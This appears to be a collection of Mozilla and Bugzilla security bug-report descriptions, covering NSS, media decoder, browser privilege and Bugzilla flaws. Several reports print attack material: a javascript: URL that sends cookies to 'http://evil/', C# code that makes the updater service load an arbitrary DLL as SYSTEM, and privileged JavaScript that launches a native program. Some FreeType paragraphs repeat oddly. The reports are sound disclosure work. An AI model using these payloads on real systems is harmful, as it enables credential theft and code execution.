        "title": "Insufficient length checking in QuickDER decoder",
        "description": "I'm afraid I have to begin the new year with not so nice news - the \"QuickDER\" ASN.1 decoder in NSS has a flaw with rather serious consequences: while it rejects bogus (oversized) lengths when trying to match a buffer against a given template, it fails to properly detect a number of zero-length items which are illegal as per X.690. This can cause all sorts of troubles: one of them is reported in bug 697420 (which happened to be the starting point for my discovery, actually). Depending on what exactly NSS - or the application - does after having called SEC_QuickDERDecodeItem, nasty bugs will occur, such as: 1) CERT_DecodeOCSPResponse() will mistakenly assume that it has successfully parsed a response, even if that response includes a zero-length ENUMERATED value. It will return the response to the caller, and when code subsequently - and rightfully - tries to clean up said response, CERT_DestroyOCSPResponse() will crash... because it's getting a bogus pointer from ocsp_GetResponseSignature(response), which it tries to dereference. 2) CERT_DecodeBasicConstraintValue is another case where illegal zero-length items lead to a serious problem: if a certificate includes a basicConstraints extension where the \"CA\" BOOLEAN is encoded with zero length, NSS mistakenly treats such a cert as a CA certificate (not as bad as Moxie's findings from 2002 about MS CAPI and basicConstraints, but still, quite worrying). I stopped looking for further issues at that point, but it would be quite surprising if these were the only ones. From my reading of X.690, of the 25 ASN.1 UNIVERSAL types currently recognized/defined in secasn1t.h, the following 7 can never have zero length (when properly DER encoded): BOOLEAN, INTEGER, BIT STRING, OBJECT_IDENTIFIER, ENUMERATED, UTCTime, GeneralizedTime. QuickDER should abort further processing when the template specifies one of these types and the buffer being processed holds such an illegal encoding. It's probably debatable what level of content checking should go into QuickDER (and what checks are better done in code which actually parses the values, such as DER_GetInteger), but some minimal zero-length sanity checks seem justified in QuickDER. The attached patch is a possible approach; note that due to re-indentation, the changes might appear larger at first sight than they effectively are. A demo \"exploit\" for the two issues mentioned above can be seen by visiting https://orod.velox.ch. First, the CA cert attached to this bug needs to be installed and trusted for SSL. A default setup of Firefox will then crash immediately in CERT_DestroyOCSPResponse() when opening the above URL. Note that the \"CA cert\" isn't really a certificate with \"CA\" set to TRUE, but NSS considers it a valid CA cert. As ASN.1 is at the heart of many parts of NSS (there are dozens of SEC_QuickDERDecodeItem calls in lib/, X.509/PKIX processing heavily depends on it), the potential impact of this issue should not be underestimated. Applications - and NSS itself - must be able to rely on SEC_QuickDERDecodeItem() rejecting invalid ASN.1 data, when asked to match this input against a given template. Note that the \"classic\" DER decoder, i.e. SEC_ASN1DecodeItem, has checks for illegal zero-length items, and will e.g. reject an OCSP response where the response status isn't encoded properly. Finally, let me point out that the patch also includes a second, belt-and-suspenders type fix: when returning a \"dest\" item with zero length (for those ASN.1 types where this is acceptable as per X.690, such as strings), QuickDER should not fill bogus pointers into dest->data - if code dealing with a SECItem afterwards only checks for a non-NULL data pointer without looking at the SECItem's length at the same time, even more subtle bugs may surface (the CERT_DecodeBasicConstraintValue actually being an example of this). I did not yet request a CVE ID number for this issue - let me know if I should do this, or if Mozilla can get an assignment."

        "description": "ZDI-CAN-1477: Mozilla Firefox Ogg Vorbis Decoding Memory Corruption Remote Code Execution Vulnerability -- CVSS ----------------------------------------- 7.5, AV:N/AC:L/Au:N/C:P/I:P/A:P -- ABSTRACT ------------------------------------- TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ------------------------ Memory corruption is possible when Firefox is parsing Ogg Vorbis files. The vulnerability is inside the function static vorbis_info_floor *floor1_unpack (vorbis_info *vi,oggpack_buffer *opb), in the file libvorbis/lib/vorbis_floor1.c: --- code snip begin --- ... for(j=0,k=0;j<info->partitions;j++){ count+=info->class_dim[info->partitionclass[j]]; for(;k<count;k++){ int t=info->postlist[k+2]=oggpack_read(opb,rangebits); if(t<0 || t>=(1<<rangebits)) goto err_out; } } ... --- code snip end --- The loop populates the info->postlist array and can be overflowed. The values which determine the amount to copy are user influenced. The info->class_dim array is populated with user data, with each element value being between 1 and 8. The info->partitions value is also taken from userdata, and can be between 0 and 31. Thus, the total sub-loop iterations can be 8*31, or 248. Each iteration of the subloop copies one element (int) into info->postlist, a fixed-size buffer which is only sized to 65 elements (int). This results in memory corruption and can be exploited to gain remote code execution. -- CREDIT --------------------------------------- This vulnerability was discovered by: regenrecht --- Confirmed crash in trunk from last night with POC at https://crash-stats.mozilla.com/report/index/bp-3f868463-5f01-4da8-966f-b8a642120119.

This is a regression, as Firefox 3.6 creates a new top-level window to which the form is submitted if the named iframe doesn't exist within the current window. This is the same behavior as the current version of Chrome. I'm setting this as moderate severity, because most high bugs involve stealing information or running script in the context of another site, but this is still bad. You could easily use this to spoof the content in another site if you know the name of an iframe there. I could be persuaded that this is in fact a high bug."

For example, admin@mozilla.org and аdmin@mozilla.org are two distinct email addresses (the latter has a Cryllic a). Given that email addresses are used as usernames, this poses an impersonation risk. It could also be used by an attacker to maintain access to a victim's account, since their email address wouldn't appear to have changed. Such attacks are severely limited by bugzilla's email validation process. I have been unable to figure out where emails sent by the current version of BMO to addresses containing utf8 actually end up. Bugzilla 4.2rc1+ sends emails to addresses with utf8 preceding the @ fine (eg bаd@sunday.slyip.net), but again utf8 in the domain name (eg good@fridаy.slyip.net) causes the emails to go missing. Allowing utf8 in the domain name would be much worse, since anyone could register gmаil.com or mozillа.org I'm not yet certain that I have fully explored the threats posed by this."

The parent window spawns the child and after a short delay invokes a 'file open' dialog from the child. Then the parent closes the child window. This causes an exploitable crash. Pre-requisites: * JavaScript enabled * Ability to create at least one pop-up window (not a tab) [browser.link.open_newwindow -> 2] [or a popup blocker bypass] * Firefox 5, 6 or Nightly [other versions not tested] In the basic POC, the faulting instruction is a CALL to freed memory: SHLWAPI!IUnknown_QueryService+0x3b: 76d842a1 ff11 call dword ptr [ecx] ds:0023:feeefeee=???????? Note that 0xfeeefeee is what is placed into Windows memory which has been HeapFree'd. We are also attaching an exploit POC; this uses two child windows. Due to certain allocation sequences, it turns out that 0x10693AEA ends up being in ECX about 30% of the time. Believe it or not, this address comes from the binary representation of the GUID for \"my computer\" {20d04fe0-3aea-1069-a2d8-08002b30309d} which ends up in the memory where ECX gets loaded. So a stable pointer value turns up in ECX quite often. On 32-bit Windows 7, a heap spray can arrange for page-aligned data to turn up at 0x10693AEA. With more work on heap feng shui (i.e, using javascript to control memory allocations) it may be possible to get 0x10693AEA into ECX more reliably or in fact directly control the value which goes into ECX. The exploit POC should show 0x0c0c0c0c at the top of the call stack. We have got code execution on Windows 7 with DEP turned off; it is also possible to get this to work on stock Windows 7 using a heap-based ROP.

        "title": "loads of principal-inheriting URIs (e.g. javascript:) on chrome-privileged pages (e.g. about:sessionstore) allows unexpected privilege escalation",
        "description": "It is possible to trap user on a chrome privileged page with buttons leading to arbitrary code if a browser session is launched with a maliciously crafted homepage URI. There are 2 things which combined may effectively prevent users from realizing they deal with a malicious link when they set their homepage by dropping an image on the home button: 1. Using DataTransfer, text/x-moz-url of the drag can be manipulated on the fly. 2. Firefox displays a misleading prompt after dropping a link on the home button -- it says that \"this document\" is being set as the homepage, which is incorrect. Thus, the user has no way of knowing what URI will be set as homepage without inspecting the source. Unless they realize that both the status bar of the dragged image and the prompt message from the browser are misleading and go check the newly set home page in Options->General (instead of simply pressing the home button to see if it goes where expected), it can be leveraged by a malicious party in 2 ways: 1. Stealing cookies. The obvious and not very interesting scenario -- javascript:Image().src='http://evil/'+encodeURI(document.cookie);location.href='http://theactualwebsite' will silently steal cookies of every website the user navigates away from by pressing the home button. 2. Code execution. Here's a video demonstrating the concept: http://www.youtube.com/watch?v=xDmyWk58Xo4 (select fullscreen and 1080p for the optimal quality) - The malicious website detects the draginit event of the icon and verifies that the desired URI landed on the homepage by probing an iframed javascript:window.home(), then it sets the cookie to schedule a crash in the next browsing session. - When a new session is started, the website starts crashing the browser. - After 2 crashes, the user is presented with about:sessionrestore and 2 options. If they decide to restore the session, Firefox will crash again and the user will return to about:sessionrestore. Trying to remove the home page tab from the list will disable the restore button. If they click the other button -- \"start a new session\" -- the javascript link will inherit chrome privileges from about:sessionrestore and an arbitrary code will be executed. Pressing the home button will execute the payload as well. Seeing that this method of setting home page is fairly popular (several well known websites provide their drag icons) and it is a seemingly innocuous action, you may want to disallow setting URI_INHERITS_SECURITY_CONTEXT as a homepage -- unless you see a demand for using bookmarklets as homepages, it would be the easiest way to make this feature safe. Displaying the actual URI in the confirmation prompt would make it less prone to abuse, too."

The problem is because of the \"remote_ip\" function in \"Bugzilla/Util.pm\" which adds this header value to the user's IP address (there is also no validation on this field). However, this \"X-FORWARDED-FOR\" can be controlled by an attacker to brute force the other people username/password. The \"remote_ip\" function also has been used in lockout modules (\"Bugzilla/User.pm: account_ip_login_failures()\") which is the reason of having this issue. Please let me know if it can be eligible for the bug bounty too. Actual results: It is possible to brute force a password without being locked by setting the \"X-FORWARDED-FOR\" value in the header of the authentication request to one of these: 1- A complete random IP or String 2- A string with the length of more than 26 characters. Ex.: \"123456789012345678901234567\" Expected results: It should prevent from brute force attack. My recommendation is: 1- First we need to have a complete validation (characters, length, format) for $ENV{'HTTP_X_FORWARDED_FOR'} in the \"remote_ip\" function. 2- This value should not be used in the user's lockout process as it can be controlled by the user. Only the main IP address should be fine for this action ($ENV{'REMOTE_ADDR'}) although it can be a proxy IP address."

Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these?

Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws.

Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws.

Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another.

Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not.

Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws.

Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not.

Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not.

        "description": "Hi, I notice two security issues in the new Mozilla updater service which came with FF12 on Windows I would like to report. a) The service path is not quoted which means you can end up with the potential for a planting attack (e.g. if you can create C:\\Program.exe it will run it when starting the service). b) The service itself can be tricked into loading a DLL into the process with SYSTEM privileges and it will run its DLLMain (meaning you can do anything you like). You call LoadLibrary instead of LoadLibraryEx on line 329 of workmonitor.cpp when checking that you have the correct resource string. It should be called to only load it as a resource. The following C# code will run the service and will load a DLL as long as the files C:\\sourcecode\\exploitme.dll and C:\\sourcecode\\updater.exe are the same. The DLL can then in DllMain run something like CreateProcess. using System; using System.ServiceProcess; namespace FFService { class Program { static void Main(string[] args) { try { ServiceController c = new ServiceController(\"MozillaMaintenance\"); c.Start(new string[] { \"aaa\", \"software-update\", \"C:\\\\sourcecode\\\\exploitme.dll\", \"aaaa\", \"c:\\\\sourcecode\\\\\", \"cccc\" }); } catch (Exception e) { Console.WriteLine(e); } } } } I have only tested in XP Pro SP3 but I assume it will work on Win7 and Vista just the same.

        "title": "Arbitrary File + Directory read via .lnk files on Windows Share",
        "description": "If a user can be persuaded to visit an HTML file hosted on a public Windows share (see below) then that page can use .lnk files to read arbitrary files and directory listings from their machine. Imagine we have index.html and foo.lnk in the same directory, with foo.lnk pointing to C:\\boot.ini. The HTML file is loaded via a file URL then loads foo.link into an iframe. The contents of boot.ini are displayed but document.location of the iframe is still foo.lnk. However, if the outer page tries to access the iframe, it gets a permission denied error as Firefox still seems to realise that the outer page and inner page are from different origins/directories. The trick is to have two link files: baz.lnk -> index.html foo.lnk -> C:\\boot.ini First we load baz.lnk, then replace baz.lnk with foo.lnk. The HTML page then loads baz.lnk (i.e. itself) using XHR or an iframe. Because the url of the requesting page matches the page loaded, Firefox assumes they're the same origin and allows the contents to be read. Both files and directories can be read in this manner. My PoC uses static .lnk files to read some system directories and the Firefox profile.ini file. However it would be possible to traverse the whole filesystem by grabbing a directory listing and then dynamically generating .lnk files on the server. There are various method to get the user to load content from a public share (e.g. file://///myhost.com/share/index.html): 1. Use a Java applet to force a drop of the URL (see bug 546909) - PoC uses this 2. Put an innocent looking unhyperlinked HTTP url on the page and get the user to copy/paste it into the location bar. When the user has selected the URL, sneakily change the current selection to the file: URL so that gets copied instead (PoC also has this as an alternative option) 3. Possibly send the file URL in an email. I've not really looked into this, but I seem to recall Outlook will open up \\\\myhost.com\\share\\index.html in Firefox if it's the default browser. This attack could either work within an intranet or possibly over the internet providing your ISP/Corporate firewall doesn't block the relevant ports. My ISP does, but I know not all do. I've attached the PoC as a zip file, as I don't currently have anywhere to host this publically. It's been tested on a few Windows XP machines, not sure if Win7 has any extra security measures to prevent things like this. Finally, this bug was found in my own time, so I promise it won't be blogged, tweeted or publicised in any way before it's fixed."

        "description": "Sigh. They're totally fucked. I don't know how we didn't think of this before. JS wrapping doesn't know about SCSWs. So our strategy is just inject them in places like NativeInterface2JSObject, and hope that nobody can actually touch the object. This works, mostly. Occasionally we find a hole (see bug 737559). But while debugging CPG wrapper reparenting fallout, I realized that there's a simple workaround. Cross-compartment wrappers don't go through SCSWs in most cases, but rather have the filtering policy built directly into them. So when an object is wrapped cross-compartment, the SCSW is stripped off. But when the object is read _back_, the JS engine has no idea that there was ever supposed to be a SCSW there. So it just says \"hey, the underlying object here is in the same compartment we're wrapping for. No wrappers needed!\" With compartment-per-global (i.e. Nightly), this is super easy make happen. Just load up a trivial iframe, define the security-checked property on its contentWindow, and read it back again. Boom. I wrote a testcase to confirm that this works. Without compartment-per-global (i.e. Aurora, Beta, ESR, and Release), it's a tiny bit trickier, since normally an origin only gets one compartment to play with. But this can be easily defeated by making the trivial iframe same-origin via document.domain (rather than by its true origin), which puts it in a separate compartment. I didn't write a testcase for this because it's 11pm and I'm tired, but I don't see why it wouldn't work just as well. On Nightly, we recently upped the ante by making the Components object protected by SCSWs (bug 735280). So this would in theory give full Components access to web content. But thankfully, I don't think gabor ever got around to removing the old-style CAPS check (did you, gabor?). So I think we're safe there for now. But we're still sitting ducks as far as Location and SOWs are concerned. So yeah, we need a story here. Pronto."

        "title": "Content Security Policy: violation reports leak OAuth 2.0 and OpenID credentials",
        "description": "The Content Security Policy (CSP) violation reports generated by Firefox include sensitive data within the \"blocked-uri\" parameter. In particular, they include fragment components and query strings even if the blocked-uri has a different origin than the protected resource (violating CSP 1.1 recommendations). Hence, a malicious website may use Firefox's CSP implementation to steal a user's OAuth 2.0 access tokens and OpenID credentials. This leads to serious attacks on popular social authorization servers such as Facebook and Google. For example, suppose a Yahoo user has previously used \"Sign in with Facebook\" to log in to Yahoo. Suppose also that the user is currently logged in to Facebook (she does not have to be logged in to Yahoo.) If she then visits attacker.com, this website can redirect her to Facebook's OAuth 2.0 endpoint, requesting an access token for the current user at Yahoo. Facebook issues a token and forwards the user to open.login.yahoo.com/#access_token=AAAXXX The key security mechanism of OAuth 2.0 is that this access token will only be sent to Yahoo, so even if the original token request was sent by an attacker, he will not be able to obtain the access token. Now, suppose attacker.com had a CSP that forbid connections to open.login.yahoo.com. Then Firefox will send a CSP violation report to \"report-uri\" that contains as its \"blocked-uri\" the full URL open.login.yahoo.com/#access_token=AAAXXX Hence, the attacker obtains the user's Facebook access token at Yahoo and may download sensitive user information from the Facebook API. For comparison, Chrome sends a \"blocked-uri\" that contains only the domain open.login.yahoo.com, avoiding the attack. A similar attack works for the Facebook OAuth 2.0 authorization code flow, allowing the attacker to steal the auth code and potentially log in as the user on Yahoo. A similar attack works on the Google OpenID interaction, where the attacker obtains the user's name and email address from Google and also a signed OpenID response that the attacker may potentially use to log in as the user to Yahoo. Demo: ---- As a proof of concept, we have built an attack webpage that silently retrieves (and stores) any visitor's names and email addresses from Facebook and Google. The preconditions for this demonstration: the visitor must be logged into Facebook or Google (in the same browser) and must have previously authorized Yahoo to access his Facebook or Google profile (by using Sign in with Facebook for example). The demo is at http://moscova.inria.fr/~karthik/csp/index.html Causes and Fixes: ----------------- The attack shown here was predicted (for a fictionalized version of OAuth) by Adam Barth in http://lists.w3.org/Archives/Public/public-web-security/2011Apr/0055.html Our demo shows that it is an effective attack on real OAuth and OpenID users, such as those using the Google, Facebook, Live, LinkedIn, and Dropbox APIs. The root issue is that Firefox does not implement the recommendations of CSP 1.1 on violation reports (section 4.15). Implementing them would disable the attack above. Specifically, Firefox must remove the <fragment> component from the blocked URI. This would prevent Facebook access tokens from being leaked. Since \"the origin of the blocked-uri is not the same as the origin of the protected resource\", Firefox should also removes the query string. This would prevent the Google OpenID identifiers from being leaked. About Us: -------- I lead a security research group called Prosecco at INRIA in France. http://prosecco.gforge.inria.fr Our work focuses on formal security proofs for cryptographic and web applications. We found this attack as part of a formal study of OAuth http://www.doc.ic.ac.uk/~maffeis/csf12.pdf We would welcome the opportunity to study any fixes you may propose and incorporate them into our analyses."

My understanding of http://code.google.com/p/chromium/issues/detail?id=118970 is that the NVIDIA drivers have a bug: glBufferData with null data doesn't actually allocate the buffer until actual data is uploaded to it. This affects WebGL. We could work around this in 2 different places in WebGL (in WebGL bufferData and in the attrib 0 emulation code), but instead, I think that this is best handled at the level of GLContext."

I debugged and didnt see a reason to wait for filing. Some of the stack frames are missing b/w #0 and #1 since this is an optimized build. But GetPreviousSibling() in #0 [see nsHTMLEditRules::DeleteNonTableElements] tells that the stale child is being accessed. It looks like raw ptr issue probably coming from http://hg.mozilla.org/mozilla-central/diff/270ac87cffba/editor/libeditor/html/nsHTMLEditRules.cpp#l1.85.

        "title": "nsICODecoder transparency bitmask memory corruption",
        "description": "This bug is present in the nsICODecoder class, when processing the transparency bitmask. It allows a remote attacker to write random memory, hence the critical severity. User action is needed in the following form: the user needs to open a web page containing a specially crafted image. First, a little summary of how Firefox processes a BMP embedded inside an ICO image: -It reads the ICONDIRENTRY -It reads the image header -It divides the image height by 2 -It passes the image header and the image data to a BMP decoder -It applies the transparency bitmask to the rendered image. Before passing the BMP image header and data to the BMP decoder, the nsICODecoder checks that the properties in the ICONDIRENTRY structure are consistent with the properties in the BMP header, and fixes them if necessary. Since the maximum height of an icon is 256, it checks that the BMP header height is no more than 256 (the image is considered invalid if it exceeds 256). Also, if the height in the ICONDIRENTRY structure and the height in the BMP header don't match, then the height in the BMP header is trusted over the height in the ICONDIRENTRY structure. Here is the code responsible for doing this, in the file nsICODecoder.cpp: 166 // A BMP inside of an ICO has *2 height because of the AND mask 167 // that follows the actual bitmap. The BMP shouldn't know about 168 // this difference though. 169 bool 170 nsICODecoder::FixBitmapHeight(PRInt8 *bih) 171 { 172 // Get the height from the BMP file information header 173 PRInt32 height; 174 memcpy(&height, bih + 8, sizeof(height)); 175 height = LITTLE_TO_NATIVE32(height); 176 177 // The bitmap height is by definition * 2 what it should be to account for 178 // the 'AND mask'. It is * 2 even if the `AND mask` is not present. 179 height /= 2; 180 181 if (height > 256) { 182 return false; 183 } 184 185 // We should always trust the height from the bitmap itself instead of 186 // the ICO height. So fix the ICO height. 187 if (height == 256) { 188 mDirEntry.mHeight = 0; 189 } else { 190 mDirEntry.mHeight = (PRInt8)height; 191 } 192 193 // Fix the BMP height in the BIH so that the BMP decoder can work properly 194 height = NATIVE32_TO_LITTLE(height); 195 memcpy(bih + 8, &height, sizeof(height)); 196 return true; 197 } The mDirEntry.mHeight variable is then used to calculate the pixel offset when applying the transparency bitmask. Note: GetRealHeight() returns mDirEntry.mHeight: 542 mCurLine = GetRealHeight(); [...] 575 PRUint32* decoded = imageData + mCurLine * GetRealWidth(); 576 PRUint32* decoded_end = decoded + GetRealWidth(); 577 PRUint8* p = mRow, *p_end = mRow + rowSize; 578 while (p < p_end) { 579 PRUint8 idx = *p++; 580 for (PRUint8 bit = 0x80; bit && decoded<decoded_end; bit >>= 1) { 581 // Clear pixel completely for transparency. 582 if (idx & bit) { 583 *decoded = 0; 584 } 585 decoded++; 586 } 587 } The vulnerability is in the nsICODecoder::FixBitmapHeight function. The \"height\" variable is declared as a PRInt32, which is a signed 32 bits integer. Consequently, if the \"height\" field of the BMP header is negative, it will pass the check at line 181: 181 if (height > 256) { 182 return false; 183 } It will then be truncated to fit into a 8 bits integer, namely mDirEntry.mHeight: 187 if (height == 256) { 188 mDirEntry.mHeight = 0; 189 } else { 190 mDirEntry.mHeight = (PRInt8)height; 191 } mDirEntry.mHeight is an unsigned 8 bits integer, so when it is assigned to mCurLine, mCurLine can be higher than the real height of the image, causing the processing of the transparency bitmask to write past the imageData array, resulting in memory corruption. This is possible because negative heights in BMP headers are acceptable, so the BMP decoder will process the image normally. To illustrate what happens with an example, we'll take a 32x8 pixels image. We have to double the initial height to account for the transparency bitmask, and make it negative, so the \"height\" value in the BMP header will be -16, which is 0xfffffff0. When we enter the nsICODecoder::FixBitmapHeight function, here is what happens: -First, the \"height\" is divided by 2. Its new value is -8, or 0xfffffff8. -The check at line 181 is passed, since -8 is not superior to 256. -mDirEntry.mHeight is assigned the value of 0xf8 (which is 0xfffffff8 truncated to 8 bits). -The BMP decoder processes the BMP data, allocating an array large enough to contain our 32x8 pixels image. -The mCurLine variable is assigned the value of mDirEntry.mHeight. Since mDirEntry.mHeight is an unsigned byte, mCurLine is equal to 0x000000f8, which is 248 in decimal. -nsICODecoder uses mCurLine to calculate an offset to the image data array. Since 248 is larger than the image real height of 8, data is written past the end of the imageData array, causing memory corruption (at line 583). The attached sample ICO file triggers the vulnerability.

It allows a remote attacker to write random memory, hence the critical severity. User action is needed in the following form: the user needs to open a web page containing a specially crafted image. The vulnerable code lies in nsBMPDecoder.cpp, at line 519: 510 if (mUseAlphaData) { 511 if (!mHaveAlphaData && p[3]) { 512 // Non-zero alpha byte detected! Clear previous 513 // pixels that we have already processed. 514 // This works because we know that if we 515 // are reaching here then the alpha data in byte 516 // 4 has been right all along. And we know it 517 // has been set to 0 the whole time, so that 518 // means that everything is transparent so far. 519 memset(mImageData + (mCurLine - 1) * GetWidth(), 0, 520 (GetHeight() - mCurLine + 1) * 521 GetWidth() * sizeof(PRUint32)); 522 mHaveAlphaData = true; 523 } This code is responsible for clearing pixels in the mImageData array, when it is processing a BMP image with an alpha channel, and encounters for the first time a non-zero alpha byte. The third parameter of memset is calculated using GetHeight(), which returns the raw \"height\" header value, even when it is negative (which is allowed for BMP images, it means pixels are stored top-to-bottom instead of bottom-to-top). The result of this calculation is then used as an unsigned 32 bits integer by memset. If GetHeight() returns a negative value, the calculation will result in a very large unsigned number, and memset() will run past the mImageData array, resulting in a memory corruption, which could in turn lead to arbitrary code execution. The code snippet above will be executed only if mUseAlphaData is true. The only way for this to happen is to have a BMP image embedded in an icon file (.ico). The nsICODecoder will instantiate a nsBMPDecoder, and call its method SetUseAlphaData with the parameter \"true\", which will set mUseAlphaData to true: nsICODecoder.cpp: 434 nsBMPDecoder *bmpDecoder = new nsBMPDecoder(mImage, mObserver); 435 mContainedDecoder = bmpDecoder; 436 bmpDecoder->SetUseAlphaData(true); Another condition is that the BMP pixel array must be in 32 bits per pixel format (Red, Green, Blue, Alpha). This is done simply by setting the \"bpp\" field to 32 in the image header. The last condition is that at least one alpha byte must be non-zero. The attached file \"bmp_with_alpha.ico\" triggers the vulnerability.

(Side note: for fun, starting with writeOutputJS, follow the call graph and check out all the places the unsafe aOutputObject can visit: <http://mxr.mozilla.org/mozilla-beta/source/browser/devtools/webconsole/HUDService.jsm#5059>.) If the toSource/toString override returned a DOM node, that node eventually gets inserted into the browser.xul document(!). From there, we can do the ol' \"exploit on* event attributes to run with chrome privileges\". Plausible attack: Take something interesting, like a prouget demo, and insert a variation of this exploit. Use Proxies (those are available to content, right?) to ensure that virtually any expression that the user enters will result in an object with a malicious toSource/toString. This POC doesn't work with Aurora and nightly builds, due to the async console split (bug 673148) and further changes. It's possible that HUDService-content.js is vulnerable, though; I simply haven't looked into it. Sorry for the drive-by and hurried comment. It's late and I have early morning obligations."

        "title": "Script access checks should use effective script origin, not origin",
        "description": "The HTML5 spec requires that browsers raise a SECURITY_ERR exception when members of the Window object (e.g. localStorage) are accessed by scripts that have a different effective script origin. Firefox allows access by scripts that have the same origin OR the same effective script origin. Here's a scenario where the new behavior has an observable security impact: https://attacker.cmu.edu/ wants to access the localStorage of https://weblogin.cmu.edu/. Assume that there exists a page at https://help.weblogin.cmu.edu/ that sets document.domain = 'cmu.edu' and that https://weblogin.cmu.edu/ sets its document.domain to 'weblogin.cmu.edu'. In Chrome/Safari/IE8, I claim that the attacker can't do it. They can inject script into the one help.weblogin.cmu.edu page that set document.domain to 'cmu.edu' but this page can't script other help.weblogin.cmu.edu pages nor can it script weblogin.cmu.edu. In Firefox 4, the attack works. The frame hierarchy looks like this: https://attacker.cmu.edu/ ---> https://help.weblogin.cmu.edu/ ---> https://help.weblogin.cmu.edu/blah ---> https://weblogin.cmu.edu/ The top frame can script the second frame by setting document.domain to 'cmu.edu', the second frame can script the third due to Firefox's non-standard access check, the third frame can script the fourth by setting its document.domain to 'weblogin.cmu.edu' There may be less contrived scenarios; this is what I could come up with after thinking about it for a few minutes. I'm setting the security flag on this bug because I haven't thought through all the ramifications of the new origin enforcement behavior, but it's fine to clear it if you feel the risk is low. Incidentally, this attack also worked in IE7, but for a different reason. IE7 allows 'help.weblogin.cmu.edu' to set its document.domain to 'weblogin.cmu.edu' after setting it to 'cmu.edu'. This was fixed in IE8, which now prohibits setting document.domain to a longer value than its current value. http://www.adambarth.com/papers/2009/barth-weinberger-song.pdf has a great explanation of how to do the HTML5 script access check quickly. The key is to get the access check down to a single pointer comparison in the common case."

This is trivially fixable by adding IsUniversalXPConnect() checks in all those methods, but that breaks tests, so we need someone to spend some time fixing up the broken tests. I'll add a patch that pretty blindly just adds the checks, but it needs more work, and I've utterly failed to find the time to fix this up, so someone else needs to take this over... Andrew, maybe you can take a stab at driving this in? Guessing that this is sg:critical, mostly because of the shear number of unknowns here."

These javascript: urls are frequently used as 'bookmarklets' to run small javascript snippets. Were a malicious party able to socially engineer a user to bookmark a javscript bookmarklet and add it to the new FF13 \"new tab page\", when the user clicked the link from the new tab page privileged javascript would run. The following is an example of privileged javascript which runs gcalctool on ubuntu: 'javascript:var file = Components.classes[\"@mozilla.org/file/local;1\"].createInstance(Components.interfaces.nsILocalFile);file.initWithPath(\"/usr/bin/gcalctool\");var process = Components.classes[\"@mozilla.org/process/util;1\"].createInstance(Components.interfaces.nsIProcess);process.init(file);var args = [];process.run(false, args, args.length);' adding that url as a bookmark and launching it from the new tab page will run the native gcalctool executable. (For windows, change the path to a windows executable.) I've attached a html page which demonstrates the steps a user would have to take. I've marked the bug as security sensitive as bookmarklets are widely used. Only tested on 32-bit firefox 13 running on ubuntu."

Per http://yuilibrary.com/support/20121030-vulnerability/, this SWF file is affected. Bugzilla 4.2 and newer were supposed to be fully upgraded to YUI 2.9.0 (bug 649879) which is not affected by this issue, and which has the following checksum: md5sum ./swfstore/swfstore.swf 844a3718c5f8c04ece6a86065a658a07 But this file has not been included in the list of updated files in bug 649879, and so we are still storing the file from YUI 2.8.x instead of the new one from YUI 2.9.0. Consequently, we are vulnerable to CVE-2012-5475. :( Attached is the patched swfstore.swf file for YUI 2.8.2 (Bugzilla 4.0): md5sum swfstore.swf 0114ab8c878ac4e48fd110f32164258b"

With a powerless account, I can access personal information, some of which power users shouldn't have access to either (even with admin or editusers privs): - (confidential) groups a user belongs to, bug 548198 (Bugzilla 4.0!) - unshared saved searches, bug 697224 (Bugzilla 4.4) This is totally unacceptable and this information must only be disclosed if you are querying your own account, i.e. the user ID matches Bugzilla->user->id. I know I approved bug 697224, but I didn't realize that all users could have access to this information. I clearly withdraw my approval here. Said differently, saved searches should never be disclosed to anyone but you. From the UI, admins have no way to get this information, except by impersonating the user account, in which case the user is informed by email that someone is looking at his account. So there is no reason that someone can have access to this information using User.get, even for admins. About groups, User.get is disclosing if a group exists or not, defeating CVE-2011-2380, see bug 653477. Bugzilla::Group->check_no_disclose() must be used instead of Bugzilla::Group->check()."
